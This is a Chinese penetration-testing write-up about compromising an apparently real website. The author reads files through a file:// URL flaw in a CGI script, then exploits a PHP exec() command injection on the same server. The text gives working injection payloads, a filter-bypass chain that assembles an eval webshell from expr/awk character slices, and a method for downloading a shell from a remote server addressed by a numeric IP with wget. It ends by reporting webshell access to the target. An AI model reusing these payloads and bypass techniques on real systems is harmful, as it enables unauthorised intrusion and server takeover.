# linux渗透测试技巧2则

0x00 背景
-------

* * *

发现一网站存在漏洞，遂进行测试：

这是一个获取网页源码的cgi脚本[http://xxx.com/cgi-bin/printfile.cgi?file=http://www.baidu.com](http://xxx.com/cgi-bin/printfile.cgi?file=http://www.baidu.com) 习惯性的,在file后面测试`../../../../../`包含或者读取漏洞均无效.有意思的是使用File协议(本地文件传输协议)成功读取目录以及文件。

![2014030416005735884.jpg](http://drops.javaweb.org/uploads/images/3d7f8b0618948f5ffa63dee15e4ec684d37c5f73.jpg)

目标环境是Red Hat6.5+Apache ，接下来的工作翻翻敏感文件,找找配置文件收集信息定位当前站点路径.

![2014030416074032436.jpg](http://drops.javaweb.org/uploads/images/7f8da630d8b6c01a62b489e224484f53f04b36d1.jpg)

0x01 发现突破点
----------

* * *

经过一段搬砖的时间查看，当前站点没有什么可以利用的,同服站点的脚本语言主要以cgi  perl  为主,少量php .一贯地毯式搜索可以利用的代码,期间找到不少有执行权限的cgi脚本,尝试在浏览器中访问,但是都提示 500内部错误,这样即使成功运行了也无法得知代码运行状态,只能放弃.又经过一段搬砖的时间,在同服站点的php文件中终于让我找到了一行有意思的php脚本代码.

```
exec('make -i -f skriptit/Makefile DOT_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$file.' htmlcheck dot2png dot2png_large dot2pdf');

```

exec() 执行外部程序,只要能控制 PICNAME='.$file.' 中的变量$file,那就有可能执行系统命令.果断保存代码本地测试.

代码分析如下:

```
<html>
<head><title>Content</title>

<link rel="stylesheet" type="text/css" href="style.css"></link>
<link rel="stylesheet" type="text/css" href="styles.css"></link>
<script type="text/javascript" src="common.js"></script><script type="text/javascript" src="css.js"></script><script type="text/javascript" src="standardista-table-sorting.js"></script>
<script type="text/javascript" src="toggle.js">
</script>
<script type="text/javascript">
function updateAppletTarget(q) {
  parent.applet.updateAppletTarget(q);
}
</script>
</head>
<body>
<div id="change">
<?php 


$id="";
if (isset($_POST["id"])) $id=$_POST["id"];         // GET或POST接收输入id
else if  (isset($_GET["id"])) $id=$_GET["id"];


if (strlen($id)>0) {

// PUBLIC_ID_SEPARATOR
//$id = ereg_replace(":","|",$id);

#$id="tesdts.fdkjfls|fjksldaf.fdsfaa";
#echo $id;

#note: equivalent function is used in fi.jyu.mit.utils.FileLib.java
#$file = ereg_replace("\\||\\.","_",$id);
$file = ereg_replace("\\||\\:|\\.","_",$id);                            //  ereg_replace -- 如果id传入数据中包含\|:.,_，则ereg_replace正则进入下一个判断。
                                                                        // string ereg_replace ( string pattern, string replacement, string string )

#echo $file;
  if (strpos($file,'\\') !== false                                       // \\strpos检索$file中的字符窜是否包含 \\ 则为false
      or strpos($file,'/') !== false
      or strpos($file,':') !== false) die('Not current directory');      // 提示 Not current directory(非当前目录)



// refresh html file and pics
#    exec('make -f Makefile -C .. PICNAME='.$file.' htmlcheck');
#   exec('make PICNAME='.$file.' htmlcheck');
# die('make -i -f skriptit/Makefile DOT_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$file.' htmlcheck dot2png dot2png_large dot2pdf');
   exec('make -i -f skriptit/Makefile DOT_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$file.' htmlcheck dot2png dot2png_large dot2pdf');  # $file往上看
#exec('make PICNAME='.$file.' dot2png dot2png_large dot2pdf');


if ((!file_exists("html/".$file.".html")) || (filesize("html/".$file.".html")==0)) {
    echo "päivitetään "."html/".$file.".html";
?>
<script type="text/javascript">
 updateAppletTarget('<?php echo $id ?>');
</script>
<?php  }
else readfile("html/".$file.".html");  

}

?>
<!-- disabled temporirarily 
<a href="#" onclick="updateAppletTarget('edit');return false;">Muokkaa</a>
-->
</div>
</body>
</html>

```

下图是本地测试，被过滤的字符：

```
 $file = ereg_replace("\\||\\:|\\.","_",$id);   

```

这里的| 以及.都被替换成_(下横)出现`// \\`路径符号则提示Not current directory(非当前目录)

![2014030416065776275.jpg](http://drops.javaweb.org/uploads/images/12dbb9de222bad9741780611e8b0c4a80cd8213e.jpg)

```
die('make -i -f skriptit/Makefile DOT\_EXEC=bin/ SCRIPTDIR=skriptit/ PICNAME='.$file.' htmlcheck dot2png dot2png\_large dot2pdf'); 

```

die 打印结果看看：

![2014030416114563586.png](http://drops.javaweb.org/uploads/images/109f8a12717a4b324b9096ba137cab0e932030b8.jpg)

打印结果可以得知

```
aaaaa, '`

```

都能带入而且;(分号)也成功执行那么就有意思了,构造语句就是:

```
http://localhost/test.php?id=aaaa;echo test >aaa

```

成功写入当前目录.

![2014030416123189624.png](http://drops.javaweb.org/uploads/images/d222edd79e9d2c33e7071214cc8a60bb758a6ef9.jpg)

当然,还可以执行命令,也同样把命令执行结果写入文件得到回显.

```
http://localhost/test.php?id=aaaa;id >aaa; 

```

注意末尾多加了一个;(分号)截断了后面多余的东西.

![2014030416131320282.png](http://drops.javaweb.org/uploads/images/5ec925bc03b25590b5809851a34ee0ece5446493.jpg)

接下就是写shell，理清一下思路:

```
$file = ereg_replace("\\||\\:|\\.","_",$id); 

```

| 以及.都被替换成_(下横)，出现`// \\`路径符号则提示Not current directory(非当前目录)，写shell 需要.(点)加后缀 ,如果直接写文件

```
http://localhost/test.php?id=aaaa;echo <?php eval($_REQUEST[v]);?> >zzz.php

```

那么得到的文件名是 zzz_php,这里也不能用\ 来转义.

![2014030416170030636.png](http://drops.javaweb.org/uploads/images/3364442e80733ea37afe06429a49ef99862ebb65.jpg)

小伙伴们可能会说,妈蛋,不是还能下载文件吗. 代码这样写

```
http://localhost/test.php?id=aaaa;wget www.ccav.com/shell.php

```

那么得到的结果是:

```
Not current directory

```

因为包含了.(点)跟路径符号.

0x02 绕过方式
---------

* * *

到这得考虑如何绕过过滤分别使用两个方法得shell.

```
1如何echo 写shell 
2.如何通过下载得shell 

```

### 第一种方法：

如何echo 写shell,以写一句话PHP木马为例,主要解决的是.(点)的问题,$(美元符号),以及>(管道符号)和括号.我这里使用的方法是”借花献佛”

echo完整的语句如下:

```
echo <?php eval($_REQUEST[v]);?> >test.php

```

既然不能生成那就 ”借”,直接借现有文件中的字符.可以从变量中借或者从现有的文件中借.用到的方法是linux Shell expr的方法.

如下图,打印了test.php文件中第一行的 6个字符，要做的就是把需要的字符都从文件中借过来。(示例的test.php 就是漏洞文件本身)

![2014030416213050474.png](http://drops.javaweb.org/uploads/images/e0af11553972e45f0a26fc487c8ecfa073eb5278.jpg)

接下来就是体力活了,要把一句话木马中所有被过滤的字符都依次借过来. 要注意的是,读取字符的间隔貌似不能包含空格,否则expr会判断列数错误.

```
root@Google:/var/www# echo `expr substr $(awk NR==20 test.php) 5 1`
 "     
root@Google:/var/www# echo `expr substr $(awk NR==20 test.php) 1 1`
 $
 root@Google:/var/www# echo `expr substr $(awk NR==1 test.php) 1 1`
 <
 root@Google:/var/www# echo `expr substr $(awk NR==1 test.php) 6 1`
>
root@Google:/var/www# expr substr $(awk NR==11 test.php) 35 1     
)     
root@Google:/var/www# expr substr $(awk NR==11 test.php) 33 1     
(
 root@Google:/var/www# expr substr $(awk NR==20 test.php) 7 1     
;
 root@Google:/var/www# expr substr $(awk NR==17 test.php) 2 1     
?

```

最后总算凑够数了,完整的语句是:

```
echo `expr substr $(awk NR==1 test.php) 1 1`?php eval`expr substr $(awk NR==11 test.php) 33 1``expr substr $(awk NR==20 test.php) 1 1`_REQUEST[v]`expr substr $(awk NR==11 test.php) 35 1``expr substr $(awk NR==20 test.php) 7 1``expr substr $(awk NR==17 test.php) 2 1``expr substr $(awk NR==1 test.php) 6 1` >2`expr substr $(awk NR==30 test.php) 13 1`php  

```

在shell 下成功执行

![2014030416261134841.png](http://drops.javaweb.org/uploads/images/0162cd747409137b9e5fa07c0d8fb76e2f4b7c05.jpg)

到这里马上就能拿到shell了,用不了多久，我就会升职加薪，当上总经理，出任CEO，迎娶白富美，走上人生巅峰。想想还有点小激动呢，嘿嘿~~ 

![2014030416275658281.jpg](http://drops.javaweb.org/uploads/images/5cd97ec71cc07f09cb8476d48a680f8ea9709a16.jpg)

我擦,这怎么玩......在测试环境上执行出现的结果,万万没想到最终还是有.(点),因为读test.php文件,还是需要带后缀. 你妹啊.....

![2014030416233033879.png](http://drops.javaweb.org/uploads/images/1a698cadaa98bf75b5cf5eee706578a228d028ec.jpg)

又回到点的问题.这次直接ls >xxx 把当前目录下的文件(目录文件带了后缀)都写入xxx，然后在从xxx 中借.(点)，替换原先的语句。

```
http://localhost/test.php?id=aaaa;ls >xxx;

```

以我本地环境为例,xxx文件的第1行第2列（2.php）的字符就是.(点)

![2014030416293419945.png](http://drops.javaweb.org/uploads/images/bdd5d0ac941aae310cd5f75a0ce72082f2732a64.jpg)

将原来语句中的test.php的.(点) 都替换成 

```
`expr substr $(awk NR==1 xxx)  2 1`

```

原语句：

```
echo `expr substr $(awk NR==1 test.php) 1 1`?php eval`expr substr $(awk NR==11 test.php) 33 1``expr substr $(awk NR==20 test.php) 1 1`_REQUEST[v]`expr substr $(awk NR==11 test.php) 35 1``expr substr $(awk NR==20 test.php) 7 1``expr substr $(awk NR==17 test.php) 2 1``expr substr $(awk NR==1 test.php) 6 1` >2`expr substr $(awk NR==30 test.php) 13 1`php

```

改为:

```
echo `expr substr $(awk NR==1 test`expr substr $(awk NR==1 xxx)  2 1`php) 1 1`?php eval`expr substr $(awk NR==11 test`expr substr $(awk NR==1 xxx)  2 1`php) 33 1``expr substr $(awk NR==20 test`expr substr $(awk NR==1 xxx)  2 1`php) 1 1`_REQUEST[v]`expr substr $(awk NR==11 test`expr substr $(awk NR==1 xxx)  2 1`php) 35 1``expr substr $(awk NR==20 test`expr substr $(awk NR==1 xxx)  2 1`php) 7 1``expr substr $(awk NR==17 test`expr substr $(awk NR==1 xxx)  2 1`php) 2 1``expr substr $(awk NR==1 test`expr substr $(awk NR==1 xxx)  2 1`php) 6 1` >2`expr substr $(awk NR==30 test`expr substr $(awk NR==1 xxx)  2 1`php) 13 1`php

```

执行出现了语法错误.

![2014030416323382082.png](http://drops.javaweb.org/uploads/images/b09cb808b7068d39e07093d850a607e7175d13a8.jpg)

换一个思路,原来绕了个大弯路.直接`cat test.php > xxoo`就解决了. 不过这样还是过滤成了test_php，只能先从 xxx把点借过来.

语句:

```
cat test`expr substr $(awk NR==2 xxx) 6 1`php >xxoo

```

这样把test.php写入xxoo文件就ok了

最后把test.php全部改成xxoo就解决了点的限制

原语句：

```
echo `expr substr $(awk NR==1 test.php) 1 1`?php eval`expr substr $(awk NR==11 test.php) 33 1``expr substr $(awk NR==20 test.php) 1 1`_REQUEST[v]`expr substr $(awk NR==11 test.php) 35 1``expr substr $(awk NR==20 test.php) 7 1``expr substr $(awk NR==17 test.php) 2 1``expr substr $(awk NR==1 test.php) 6 1` >2`expr substr $(awk NR==30 test.php) 13 1`php

```

修改后:

```
echo `expr substr $(awk NR==1 xxoo) 1 1`?php eval`expr substr $(awk NR==11 xxoo) 33 1``expr substr $(awk NR==20 xxoo) 1 1`_REQUEST[v]`expr substr $(awk NR==11 xxoo) 35 1``expr substr $(awk NR==20 xxoo) 7 1``expr substr $(awk NR==17 xxoo) 2 1``expr substr $(awk NR==1 xxoo) 6 1` >2`expr substr $(awk NR==30 xxoo) 13 1`php

```

测试环境成功执行:

```
http://localhost/test.php?id=anything;echo `expr substr $(awk NR==1 xxoo) 1 1`?php eval`expr substr $(awk NR==11 xxoo) 33 1``expr substr $(awk NR==20 xxoo) 1 1`_REQUEST[v]`expr substr $(awk NR==11 xxoo) 35 1``expr substr $(awk NR==20 xxoo) 7 1``expr substr $(awk NR==17 xxoo) 2 1``expr substr $(awk NR==1 xxoo) 6 1` >2`expr substr $(awk NR==30 xxoo) 13 1`php;

```

![2014030416381681081.png](http://drops.javaweb.org/uploads/images/791df8bba2e581774adf241a4cce2ad77b9dcafb.jpg)

最终成功写入完整的php一句话木马.拿下目标webshell 权限.

![2014030416360451579.png](http://drops.javaweb.org/uploads/images/06a1e1a9e6ee55e79aa8ae00cd4474500a9aa745.jpg)

### 总结步骤：

#### 1) 

```
ls >xxx ，cat xxx    //先找点，得到.的行列数。

```

#### 2)

```
Cat  test.`expr substr $(awk NR==1 xxx)  2 1`php  > xxoo  //将test.php 写入xxoo文件，方便后面读取。

```

#### 3)

```
echo `expr substr $(awk NR==1 xxoo) 1 1`?php eval`expr substr $(awk NR==11 xxoo) 33 1``expr substr $(awk NR==20 xxoo) 1 1`_REQUEST[v]`expr substr $(awk NR==11 xxoo) 35 1``expr substr $(awk NR==20 xxoo) 7 1``expr substr $(awk NR==17 xxoo) 2 1``expr substr $(awk NR==1 xxoo) 6 1` >2`expr substr $(awk NR==30 xxoo) 13 1`php;     //所需的字符从替换成xxoo文件中的字符。

```

### 第二种方法:

通过下载文件得到shell,这种方法要省事很多,要解决的关键还是.(点),还有//(路径符).(点)的解决可以用数字IP的方法绕过.

需要条件:

```
外网能用ip访问的webserver,以及目标存在wget程序和当前目录有写文件权限。 

```

在线转换链接:

```
http://tool.chinaz.com/ip/?IP=127.0.0.1

```

![2014030416412310827.png](http://drops.javaweb.org/uploads/images/d6e64fe04e952a662bf868c64ad5865b636c6a35.jpg)

以本机为例（ubuntu +apache2:）

```
1.先转换得到数字ip  127.0.0.1 = 2130706433 
2.将外网的服务器的php解析去掉,在apache配置文件中将下面参数注释 
#LoadModule php5_module /usr/lib/apache2/modules/libphp5.so 
3.在根目录创建index.html文件,内容为`<a href="shell.php">test</a>`，创建shell.php 内容是马. 
4.使用wget 整站下载功能下载（wget自动沿着href 指向爬到shell.php并下载） 
Ps:貌似用301跳转也可以,不过我没有测试 

```

参数: wget -r 2130706433  

效果如下图，下载后以目录结构的方式保存文件得到shell。

![2014030416425192388.png](http://drops.javaweb.org/uploads/images/efd08e19968ba4351e06d89da005c00d2e1f9eab.jpg)

0x03 最后
-------

* * *

欢迎大家指正错误或纰漏，以此文为例，希望大家分享一些linux shell下绕过字符过滤写shell的方法，

最后感谢月哥悉心的指导。